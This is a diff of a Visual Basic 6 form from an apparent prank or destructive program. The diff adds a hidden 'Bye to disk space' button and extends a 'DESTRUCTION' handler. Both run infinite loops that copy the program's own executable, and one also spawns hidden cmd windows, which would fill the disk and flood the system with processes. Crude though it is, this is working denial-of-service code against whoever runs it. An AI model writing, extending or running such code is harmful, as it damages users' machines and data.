@@ -10,16 +10,18 @@ Begin VB.Form DPZKMAIN
    ScaleWidth      =   8280
    StartUpPosition =   3  'Windows Default
    Begin VB.CommandButton Command4 
+      Caption         =   "Bye to disk space"
       Height          =   615
-      Left            =   4200
+      Left            =   2880
       TabIndex        =   3
       Top             =   0
+      Visible         =   0   'False
       Width           =   1455
    End
    Begin VB.CommandButton Command3 
       Caption         =   "DESTRUCTION"
       Height          =   615
-      Left            =   2880
+      Left            =   4320
       TabIndex        =   2
       Top             =   0
       Visible         =   0   'False
@@ -79,6 +81,7 @@ Private Sub Command3_Click()
 'LOLOLO
 Command2.Caption = "loLOLOLOLOLOl"
 Do While True
+FileCopy App.Path + "\" + App.EXEName + ".exe", App.Path + "\" + "dpzk" + ".exe"
 Dim lol
 lol = Shell("cmd", vbHide)
 'LOL
@@ -90,12 +93,11 @@ End Sub
 
 Private Sub Command4_Click()
 Do While True
-Print (App.Path + "\" + App.EXEName + ".exe")
-Print (App.Path + "\" + "dpzk" + ".exe")
-Print (Rnd())
-Print (Str(Rnd()))
+'Print (App.Path + "\" + App.EXEName + ".exe")
+'Print (App.Path + "\" + "dpzk" + ".exe")
+'Print (Rnd())
+'Print (Str(Rnd()))
 'Print FileSystem.FileExists(App.Path + "\" + App.EXEName + ".exe"))
-Dim a
 FileCopy App.Path + "\" + App.EXEName + ".exe", App.Path + "\" + "dpzk" + ".exe"
 Loop
 End Sub
@@ -110,11 +112,13 @@ If EnNwtsEd Then
 Command1.Visible = True
 Command2.Visible = True
 Command3.Visible = True
+Command4.Visible = True
 OpNwts.Caption = "Disable Nwts(dangerous) Functions"
 Else
-Command1.Visible = Disable
-Command2.Visible = Disable
+Command1.Visible = False
+Command2.Visible = False
 Command3.Visible = False
+Command4.Visible = False
 OpNwts.Caption = "Enable Nwts(dangerous) Functions"
 End If
 End Sub
